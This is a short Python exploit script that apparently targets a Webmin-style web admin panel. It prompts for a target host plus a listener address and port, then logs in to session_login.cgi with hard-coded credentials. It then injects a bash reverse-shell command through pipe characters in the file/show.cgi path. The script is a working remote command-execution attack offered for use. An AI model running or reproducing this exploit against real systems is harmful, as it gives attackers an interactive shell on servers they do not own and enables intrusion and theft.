import requests
import sys
import secrets
import string

ip=input("Enter IP address or host to attack: ")
lhost = input("Enter LHOST: ")
lport = input("Enter LPORT: ")

def rand():
    alphaNum = string.ascii_letters + string.digits
    randChar = ''.join(secrets.choice(alphaNum) for i in range(5))
    return randChar
def payload():
    payload = f"bash -c 'exec bash -i &> /dev/tcp/{lhost}/{lport}<&1' "
    return payload
    
def main():
    url=f"http://{ip}/session_login.cgi"
    data ={
        "page" : "%2F",
        "user" : "user1",
        "pass" : "1user"
    }
    r = requests.post(url, data=data, cookies={"testing": "1"}, verify = False, allow_redirects = False)
    if r.status_code == 302 and r.cookies["sid"] != None:
        print(f"[+] Login successfully!, executing payload, please wait...")
    else:
        print(f"[-] Login failed")
    sid = r.cookies["sid"]
    print(f"Cookie: {sid}")
    exp = f"http://{ip}/file/show.cgi/bin/{rand()}|{payload()}|"
    req = requests.post(exp, cookies={"sid":sid}, verify=False, allow_redirects=False)

if __name__ == "__main__":
    main()
